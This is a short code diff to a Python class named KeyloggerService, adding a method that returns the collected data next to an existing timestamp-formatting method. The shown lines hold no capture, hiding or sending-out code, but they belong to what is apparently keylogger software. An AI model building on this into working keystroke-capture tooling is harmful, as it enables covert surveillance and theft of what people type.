@@ -51,3 +51,7 @@ class KeyloggerService:
     def getTime(self, event):
         return datetime.fromtimestamp(event.time).strftime("%Y-%m-%d %H:%M")
 
+
+    def get_collected_data(self):
+        return self.data
+
